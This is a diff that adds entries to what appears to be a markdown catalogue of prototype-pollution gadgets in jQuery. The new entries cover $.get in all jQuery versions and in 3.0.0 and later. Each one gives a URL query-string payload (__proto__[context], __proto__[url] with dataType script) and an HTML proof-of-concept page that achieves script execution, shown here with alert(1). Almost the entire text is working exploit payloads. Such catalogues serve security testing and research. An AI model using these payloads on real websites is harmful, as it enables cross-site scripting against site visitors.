@@ -92,3 +92,40 @@ return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.j
   $.getScript('https://google.com/')
 </script>
 ```
+
+#### $.get jQuery all versions
+
+```
+?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
+```
+
+```html
+<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.js></script>
+<script> 
+  Object.prototype.context = '<img/src/onerror=alert(1)>';
+  Object.prototype.jquery = 'x';
+</script>      
+<script>
+  jQuery.get('http://google.com/');
+</script>
+```
+
+#### $.get jQuery >= 3.0.0
+
+```
+?__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=
+```
+
+```html
+<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js></script>
+<script> 
+  Object.prototype.url = 'data:,alert(1)//';
+  Object.prototype.dataType = 'script';   
+  Object.prototype.crossDomain = '';
+</script>      
+<script>
+  $.get('http://google.com/'); 
+  $.post('http://google.com/'); 
+</script>
+```
+
